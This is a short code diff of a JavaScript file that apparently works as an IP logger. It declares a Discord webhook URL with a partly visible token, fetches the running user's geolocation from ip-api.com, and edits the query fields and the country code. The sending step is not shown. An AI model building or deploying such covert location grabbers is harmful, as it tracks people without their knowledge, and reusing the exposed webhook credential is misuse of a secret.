@@ -7,7 +7,7 @@ var webHookUrl = "https://discord.com/api/webhooks/1355599176821637404/5gKk2OXgS
 */
 
 const request = async () => { // Calling a "synchronous" fetch
-    const response = await fetch('https://ip-api.com/json/');
+    const response = await fetch('https://ip-api.com/json/?fields=61439');
     const data = await response.json();
 
     // Declaring variables
@@ -17,7 +17,7 @@ const request = async () => { // Calling a "synchronous" fetch
 
     var timezone = data.timezone;
     var country = data.country;
-    var countryCode = data.countryCode.toLowerCase()
+    var countryCode = "test"
     var region = data.region + " (" + data.regionName + ")";
     var city = data.city;
 
